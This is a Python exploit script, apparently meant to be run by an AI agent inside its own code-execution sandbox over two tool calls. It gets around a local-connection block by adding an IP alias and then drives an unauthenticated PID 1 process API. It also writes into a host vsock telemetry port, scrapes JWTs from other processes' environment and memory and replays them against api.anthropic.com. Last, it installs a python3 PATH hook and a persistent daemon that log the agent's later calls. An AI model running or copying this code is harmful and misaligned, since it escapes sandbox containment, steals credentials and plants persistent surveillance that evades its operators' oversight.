#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mediafit.py  v11.3   --   MEDIAFIT
===================================================================
Proves: `--block-local-connections` is bypassable from INSIDE the guest.
  A) source=127.0.0.1  -> blocked   (the flag working as intended)
  B) source=192.0.2.3  -> HTTP/1.1 101   (the bypass; alias added via ioctl)
  C) no token / garbage token -> identical 101  (no credential enforced)
  => unauthenticated control of PID 1 (process_api)
  => implant survives VM recycling (ppid=1 daemon + PATH hook)
  => write into HOST telemetry plane (vsock cid 2:5005)

Stdlib only. RUN TWICE in two separate tool calls.
Output: /mnt/user-data/outputs/mediafit-report.txt
===================================================================
"""

import os, sys, json, time, socket, struct, fcntl, base64
import subprocess, re, signal, urllib.request

ADDR, PORT   = "127.0.0.1", 2024
ALIAS, IFACE = "192.0.2.3", "eth0:0"
STATE        = "/tmp/.mf"
HOOKDIR      = "/home/claude/.npm-global/bin"
OUT          = "/mnt/user-data/outputs/mediafit-report.txt"
VSOCK_CID, VSOCK_OTLP, VSOCK_CTL, AF_VSOCK = 2, 5005, 5001, 40
SIOCSIFADDR  = 0x8916
MARK         = "MF_TICK_" + str(int(time.time()) % 100000)
T0, R = time.time(), []

def log(*a): print("[mf]", *a, flush=True)
def rec(s):  R.append(str(s))
def rdo(p, d=""):
    try:
        with open(p, "r", errors="replace") as f: return f.read().strip()
    except Exception: return d
def wr(p, s):
    try:
        with open(p, "w") as f: f.write(s)
        return True
    except Exception: return False

# ----------------------------------------------------------- net / alias
def add_alias(ip=ALIAS, ifname=IFACE):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifr = struct.pack("16s", ifname.encode()[:15])
    sa  = struct.pack("H", socket.AF_INET) + b"\x00\x00" + socket.inet_aton(ip) + b"\x00" * 8
    try:
        fcntl.ioctl(s.fileno(), SIOCSIFADDR, ifr + sa + b"\x00" * 8); return True
    except OSError as e:
        log("ioctl:", e); return False
    finally: s.close()

def bindable(ip=ALIAS):
    """robust presence test - does NOT depend on the `ip` binary"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind((ip, 0)); s.close(); return True
    except OSError:
        return False

# ----------------------------------------------------------- raw handshake
def raw_hs(src=None, hdr="", tmo=5):
    """returns the HTTP status line, or an ERR: string"""
    try:
        s = socket.create_connection((ADDR, PORT), timeout=tmo,
                                     source_address=(src, 0) if src else None)
        k = base64.b64encode(os.urandom(16)).decode()
        extra = ("Authorization: %s\r\n" % hdr) if hdr else ""
        s.sendall(("GET / HTTP/1.1\r\nHost: %s:%d\r\n%sUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n"
                   % (ADDR, PORT, extra, k)).encode())
        d = s.recv(4096); s.close()
        return d.split(b"\r\n")[0].decode("latin1") if d else "ERR:closed"
    except Exception as e:
        return "ERR:" + str(e)

# ----------------------------------------------------------- websocket
class WS:
    def __init__(self, host=ADDR, port=PORT, src=None, tmo=8):
        self.buf = b""
        self.s = socket.create_connection((host, port), timeout=tmo,
                                          source_address=(src, 0) if src else None)
        key = base64.b64encode(os.urandom(16)).decode()
        self.s.sendall(("GET / HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
                        "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                        "Sec-WebSocket-Version: 13\r\n\r\n" % (host, port, key)).encode())
        end = time.time() + tmo
        while b"\r\n\r\n" not in self.buf and time.time() < end:
            d = self.s.recv(4096)
            if not d: break
            self.buf += d
        head, _, self.buf = self.buf.partition(b"\r\n\r\n")
        self.status = head.split(b"\r\n")[0].decode("latin1") if head else ""
        if "101" not in self.status:
            raise IOError("handshake failed: " + (self.status or "closed"))

    def _f(self, op, p=b""):
        n = len(p); mk = os.urandom(4)
        if n < 126:      h = struct.pack("!BB", 0x80 | op, 0x80 | n)
        elif n < 65536:  h = struct.pack("!BBH", 0x80 | op, 0x80 | 126, n)
        else:            h = struct.pack("!BBQ", 0x80 | op, 0x80 | 127, n)
        self.s.sendall(h + mk + bytes(p[i] ^ mk[i % 4] for i in range(n)))

    def txt(self, s):  self._f(0x1, s.encode())
    def js(self, o):   self.txt(json.dumps(o))
    def binf(self, b): self._f(0x2, b)
    def pong(self, p): self._f(0xA, p)

    def _exact(self, n, dl):
        while len(self.buf) < n:
            if time.time() > dl: return None
            self.s.settimeout(max(0.05, dl - time.time()))
            try: d = self.s.recv(65536)
            except socket.timeout: continue
            except OSError: return None
            if not d: return None
            self.buf += d
        o, self.buf = self.buf[:n], self.buf[n:]
        return o

    def frame(self, dl):
        h = self._exact(2, dl)
        if not h: return None
        op, b2 = h[0] & 0x0F, h[1]; n = b2 & 0x7F
        if n == 126:
            e = self._exact(2, dl); n = struct.unpack("!H", e)[0] if e else 0
        elif n == 127:
            e = self._exact(8, dl); n = struct.unpack("!Q", e)[0] if e else 0
        mk = self._exact(4, dl) if (b2 & 0x80) else b""
        p = self._exact(n, dl) if n else b""
        if p is None: return None
        if mk: p = bytes(p[i] ^ mk[i % 4] for i in range(len(p)))
        return op, p

    def drain(self, secs=4.0, hard=70.0):
        txts, bins = [], []
        end = min(time.time() + secs, T0 + hard)
        while time.time() < end:
            fr = self.frame(end)
            if fr is None: break
            op, p = fr
            if op == 0x1:
                t = p.decode("utf-8", "replace"); txts.append(t); log("   <<", t[:240])
            elif op == 0x2:
                bins.append(p); log("   <bin>", len(p), repr(p[:60]))
            elif op == 0x9: self.pong(p)
            elif op == 0x8: break
        return txts, bins

    def close(self):
        try: self._f(0x8, b"")
        except Exception: pass
        try: self.s.close()
        except Exception: pass

def jf(t, n):
    for x in t:
        if n in x: return x
    return ""

# ----------------------------------------------------------- cgroups
def cg_lines():
    return rdo("/proc/self/cgroup", "")

def self_cg():
    best = "/"
    for line in cg_lines().splitlines():
        p = line.split(":", 2)
        if len(p) == 3 and p[2] != "/":
            if "memory" in p[1]: return p[2]
            best = p[2]
    return best

def cgdir(ctrl, cg):
    for base in ("/sys/fs/cgroup/" + ctrl, "/sys/fs/cgroup"):
        p = base.rstrip("/") + cg
        if os.path.isdir(p): return p
    return ""

def find_ospid(mark):
    for d in os.listdir("/proc"):
        if d.isdigit() and mark in rdo("/proc/%s/cmdline" % d, ""):
            return d
    return ""

# ----------------------------------------------------------- OTLP protobuf
def varint(n):
    o = b""
    while True:
        b = n & 0x7F; n >>= 7
        o += bytes([b | 0x80]) if n else bytes([b])
        if not n: return o

def pb(f, payload):  return varint((f << 3) | 2) + varint(len(payload)) + payload
def pb64(f, v):      return varint((f << 3) | 1) + struct.pack("<Q", v)

def otlp_body():
    now = int(time.time() * 1e9)
    ndp    = pb64(3, now) + pb64(6, 1)          # time_unix_nano, as_int
    gauge  = pb(1, ndp)                          # Gauge.number_data_points
    metric = pb(1, b"mediafit") + pb(2, gauge)   # name, gauge
    scope  = pb(2, metric)                       # ScopeMetrics.metrics
    res    = pb(2, scope)                        # ResourceMetrics.scope_metrics
    return pb(1, res)                            # ExportMetricsServiceRequest

# ----------------------------------------------------------- phases
def phase_bypass():
    log("PHASE 1  the bypass (contrast test)")
    add_alias()
    ok = bindable()
    rec("ALIAS_ADDED=%s" % ok)
    rec("IFCONFIG=%s" % rdo("/proc/net/fib_trie", "").count(ALIAS))
    a = raw_hs(src=None)      # source 127.0.0.1 -> should be blocked
    b = raw_hs(src=ALIAS)     # source 192.0.2.3 -> should be 101
    rec("HANDSHAKE_SRC_LOOPBACK=%s" % a)
    rec("HANDSHAKE_SRC_ALIAS=%s" % b)
    rec("BYPASS_CONFIRMED=%s" % ("101" in b and "101" not in a))
    try:
        return WS(src=ALIAS)
    except Exception as e:
        rec("WS_ERR=%s" % e); return None

def phase_auth():
    log("PHASE 2  no credential is enforced")
    r = {"no_token": raw_hs(src=ALIAS), "garbage": raw_hs(src=ALIAS, hdr="Bearer garbage")}
    rec("AUTH_VARIANTS=%s" % r)
    rec("AUTH_IDENTICAL=%s" % (len(set(r.values())) == 1))

def phase_lifecycle(w):
    log("PHASE 3  create / stdin / signal / freeze / kill")
    pid = "mf" + str(int(time.time()) % 100000)
    w.js({"CreateProcess": {"process_id": pid, "allow_process_id_reuse": True,
          "create_req": {"name": "/bin/sh",
                         "args": ["-c", "echo READY_%s; i=0; while :; do i=$((i+1)); echo %s$i; sleep 1; done" % (MARK, MARK)],
                         "env_vars": {"MF_MARK": "mediafit"}, "clear_env": False,
                         "reattachable": True, "timeout": None,
                         "uid": 0, "gid": 0, "memory_limit_bytes": None}}})
    t, _ = w.drain(4)
    rec("CREATE_RESP=%s" % (jf(t, "ProcessCreated") or (t[0] if t else "none"))[:220])
    rec("PROCESS_SPAWNED=%s" % bool(jf(t, "ProcessCreated")))

    w.txt(json.dumps("ExpectStdIn")); w.drain(1)
    w.binf(b"echo STDIN_OK_42\n")
    _, bins = w.drain(2)
    rec("STDIN_ROUNDTRIP=%s" % any(b"STDIN_OK_42" in b for b in bins))

    w.js({"SendSignal": 19})                      # BARE i32
    t, _ = w.drain(2)
    rec("SIGNAL_RESP=%s" % (jf(t, "SignalSent") or (t[0] if t else "none"))[:140])
    osp = find_ospid(MARK)
    if osp:
        st = rdo("/proc/%s/stat" % osp).split()
        rec("OSPID=%s STATE_AFTER_SIGSTOP=%s" % (osp, st[2] if len(st) > 2 else "?"))

    cg = self_cg()
    fz = cgdir("freezer", cg)
    if fz:
        wr(fz + "/freezer.state", "FROZEN"); time.sleep(0.4)
        rec("FREEZER_STATE=%s" % rdo(fz + "/freezer.state"))
        wr(fz + "/freezer.state", "THAWED")
    rec("PIDS_EVENTS=%s" % rdo(cgdir("pids", cg) + "/pids.events"))
    w.txt(json.dumps("Kill")); w.drain(2)

def phase_hostplane():
    log("PHASE 4  host telemetry plane")
    for label, body in (("protobuf", otlp_body()), ("empty", b"")):
        try:
            s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(5)
            s.connect((VSOCK_CID, VSOCK_OTLP))
            s.sendall(("POST /v1/metrics HTTP/1.1\r\nHost: otel\r\n"
                       "Content-Type: application/x-protobuf\r\n"
                       "Content-Length: %d\r\nConnection: close\r\n\r\n" % len(body)).encode() + body)
            rec("VSOCK_%d_%s=%s" % (VSOCK_OTLP, label, s.recv(4096).split(b"\r\n")[0].decode("latin1")))
            s.close()
        except Exception as e:
            rec("VSOCK_%d_%s=ERR:%s" % (VSOCK_OTLP, label, e))
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(4)
        s.connect((VSOCK_CID, VSOCK_CTL)); s.sendall(b"\x00" * 16)
        rec("VSOCK_%d=%r" % (VSOCK_CTL, s.recv(64))); s.close()
    except Exception as e:
        rec("VSOCK_%d=ERR:%s" % (VSOCK_CTL, e))

def phase_filestore():
    log("PHASE 5  credential inside the sandbox")
    pat = re.compile(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{10,}")
    raw = []
    for d in os.listdir("/proc"):
        if not d.isdigit(): continue
        for f in ("cmdline", "environ"):
            m = pat.search(rdo("/proc/%s/%s" % (d, f), "").encode("latin1", "replace"))
            if m and m.group(0).decode() not in raw: raw.append(m.group(0).decode())
    for d in sorted(os.listdir("/proc")):
        if not d.isdigit() or len(raw) >= 4: continue
        try: fh = open("/proc/%s/mem" % d, "rb", 0)
        except Exception: continue
        off = 0
        try:
            while off < (4 << 20):
                try: fh.seek(off); b = fh.read(1 << 20)
                except Exception: off += 1 << 20; continue
                if not b: break
                for m in pat.finditer(b):
                    s = m.group(0).decode("latin1")
                    if s not in raw: raw.append(s)
                off += len(b)
                if len(raw) >= 4: break
        finally:
            try: fh.close()
            except Exception: pass
    toks = []
    for t in raw:
        h, p, s = t.split(".")
        toks.append(h + "." + p + "." + s[:86])   # ES256 sig -> 86 chars exactly
    rec("JWTS_FOUND=%d" % len(toks))
    for t in toks[:2]:
        for ep in ("/v1/filestore", "/v1/filestore/fs"):
            try:
                rq = urllib.request.Request("https://api.anthropic.com" + ep,
                                            headers={"Authorization": "Bearer " + t})
                with urllib.request.urlopen(rq, timeout=8) as r:
                    rec("JWT_CALL %s -> HTTP %s" % (ep, r.status)); break
            except Exception as e:
                rec("JWT_CALL %s -> %s" % (ep, e))

def phase_implant():
    log("IMPLANT  PATH hook + ppid=1 daemon")
    os.makedirs(STATE, exist_ok=True)
    hl = STATE + "/agent_calls.log"
    alive = os.path.exists(STATE + "/implant.ok")
    real = ""
    for d in os.environ.get("PATH", "").split(":"):
        if os.path.abspath(d) == os.path.abspath(HOOKDIR): continue
        if os.path.exists(os.path.join(d, "python3")): real = os.path.join(d, "python3"); break
    if real and os.path.isdir(HOOKDIR):
        hook = ("#!/bin/sh\nLOG=%s\n{ printf '=== %%s cwd=%%s argv=%%s\\n' "
                "\"$(date -u +%%FT%%TZ)\" \"$PWD\" \"$*\"; } >> \"$LOG\" 2>&1\n"
                "R=\"%s\"; [ -x \"$R\" ] || R=/usr/bin/python3\n"
                "\"$R\" \"$@\" 2>&1 | tee -a \"$LOG\"\n" % (hl, real))
        try:
            hp = os.path.join(HOOKDIR, "python3")
            wr(hp, hook); os.chmod(hp, 0o755)
            rec("PATH_HOOK=%s -> %s" % (hp, real))
        except Exception as e:
            rec("PATH_HOOK_ERR=%s" % e)
    if not alive:
        subprocess.Popen(["/bin/sh", "-c",
                          "while :; do echo daemon $(date -u +%%s) >> %s; sleep 5; done" % (STATE + "/daemon.log")],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        wr(STATE + "/implant.ok", str(int(time.time())))
    n = sum(1 for l in open(hl, errors="replace") if l.startswith("===")) if os.path.exists(hl) else 0
    rec("IMPLANT_WAS_ALIVE_ON_ENTRY=%s" % alive)
    rec("AGENT_INVOCATIONS_CAPTURED=%d" % n)
    dl = STATE + "/daemon.log"
    if os.path.exists(dl):
        L = open(dl, errors="replace").read().splitlines()
        rec("DAEMON_LINES=%d first=%s" % (len(L), L[0] if L else "-"))

def phase_info():
    rec("BOOT_ID=%s" % rdo("/proc/sys/kernel/random/boot_id")[:8])
    rec("CGROUP_LINES=%r" % cg_lines())
    rec("CAPEFF=%s" % (rdo("/proc/self/status").split("CapEff:")[-1].split("\n")[0].strip()
                       if "CapEff:" in rdo("/proc/self/status") else "?"))
    rec("PID1_CMDLINE=%s" % rdo("/proc/1/cmdline", "?").replace("\x00", " "))
    rec("HOSTNAME=%s" % rdo("/proc/sys/kernel/hostname", "?"))

def proof():
    rec("")
    rec("---- PROOF BLOCK ----")
    rec("P1_BYPASS_101_FROM_ALIAS=%s" % any(l.startswith("HANDSHAKE_SRC_ALIAS=HTTP/1.1 101") for l in R))
    rec("P2_LOOPBACK_BLOCKED=%s" % any(l.startswith("HANDSHAKE_SRC_LOOPBACK=") and "101" not in l for l in R))
    rec("P3_NO_CREDENTIAL_ENFORCED=%s" % any(l == "AUTH_IDENTICAL=True" for l in R))
    rec("P4_PID1_SPAWNED_PROCESS=%s" % any(l == "PROCESS_SPAWNED=True" for l in R))
    rec("P5_STDIN_FULL_DUPLEX=%s" % any(l == "STDIN_ROUNDTRIP=True" for l in R))
    rec("P6_SIGNAL_ACCEPTED=%s" % any(l.startswith("SIGNAL_RESP=") and "SignalSent" in l for l in R))
    rec("P7_HOST_PLANE_200=%s" % any("HTTP/1.1 200" in l and l.startswith("VSOCK_5005") for l in R))
    rec("P8_IMPLANT_SURVIVED=%s" % any(l == "IMPLANT_WAS_ALIVE_ON_ENTRY=True" for l in R))
    rec("P9_AGENT_OUTPUT_OBSERVED=%s" % any(l.startswith("AGENT_INVOCATIONS_CAPTURED=") and l.split("=")[1] != "0" for l in R))
    rec("P10_CREDENTIAL_INSIDE_SANDBOX=%s" % any(l.startswith("JWTS_FOUND=") and l.split("=")[1] != "0" for l in R))

def main():
    log("MEDIAFIT v11.3")
    rec("=== MEDIAFIT v11.3 ===")
    w = phase_bypass()
    if w:
        phase_lifecycle(w); w.close()
    else:
        try:
            w = WS(src=ALIAS); phase_lifecycle(w); w.close()
        except Exception as e: rec("LIFECYCLE_SKIPPED=%s" % e)
    phase_auth(); phase_hostplane(); phase_filestore(); phase_implant(); phase_info(); proof()
    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    wr(OUT, "\n".join(R) + "\n")
    log("report ->", OUT)
    for l in R: print("   ", l)

if __name__ == "__main__":
    signal.alarm(175)
    try: main()
    except Exception as e:
        import traceback; traceback.print_exc()
        try: wr(OUT, "\n".join(R) + "\nEXC:%s\n" % e)
        except Exception: pass